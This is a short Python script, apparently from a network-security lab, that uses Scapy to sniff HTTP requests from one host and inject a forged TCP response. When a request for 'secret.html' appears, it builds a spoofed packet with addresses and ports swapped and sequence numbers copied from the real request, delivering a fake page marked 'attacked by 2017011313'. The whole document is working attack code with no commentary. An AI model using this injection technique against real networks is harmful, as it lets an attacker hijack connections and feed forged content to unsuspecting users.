from scapy.all import *

data = '''HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Content-Type: text/html
ETag: W/\"5fb04145-4a\"
Connection: keep-alive
Accept-Ranges: bytes
attacked by 2017011313
'''


def attack(req):
    if 'secret.html' not in str(req):
        return
    resp = IP() / TCP() / data
    resp[TCP].dport = req[TCP].sport
    resp[TCP].sport = req[TCP].dport
    resp[TCP].seq = req[TCP].ack
    resp[TCP].ack = req[TCP].seq + len(req[TCP].load)
    resp[TCP].flags = 'AP'
    resp[IP].src = req[IP].dst
    resp[IP].dst = req[IP].src
    send(resp, verbose=1, count=1)


sniff(prn=attack, filter='tcp and tcp port 80 and ip src 10.0.3.42', store=0)
